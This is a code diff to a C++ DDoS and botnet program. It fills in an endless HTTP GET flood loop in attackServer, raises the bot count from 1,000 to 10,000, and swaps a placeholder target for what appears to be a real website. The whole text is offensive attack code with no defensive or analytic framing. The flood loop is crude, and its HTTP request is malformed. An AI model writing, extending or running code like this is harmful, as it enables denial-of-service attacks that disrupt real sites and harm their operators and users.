@@ -61,7 +61,12 @@ void attackServer(const std::string& target) {
         return;
     }
 
-    // Perform DDoS attack here
+    while (true) {
+        std::string requestData = "GET / HTTP/1.1\r\nHost: " + target + "\r\n";
+        for (int i = 0; i < MAX_CONNECTIONS; ++i) {
+            send(sock, requestData.c_str(), requestData.size(), 0);
+        }
+    }
 
     close(sock);
 }
@@ -84,7 +89,7 @@ void buildBotnet() {
     int startingIP = 101; // Starting IP address
     int startingPort = 5555; // Starting port number
 
-    for (int i = 0; i < 1000; ++i) { // Adjust the number of iterations here
+    for (int i = 0; i < 10000; ++i) { // Adjust the number of iterations here
         Bot bot;
         bot.ip = baseIP + std::to_string(startingIP++);
         bot.port = startingPort++;
@@ -135,7 +140,7 @@ void executeCommand(const std::string& command, const std::string& target) {
 }
 
 int main() {
-    std::string target = "www.target-website.com";
+    std::string target = "https://kantotin.com/";
 
     buildBotnet();
     infectServer(target);
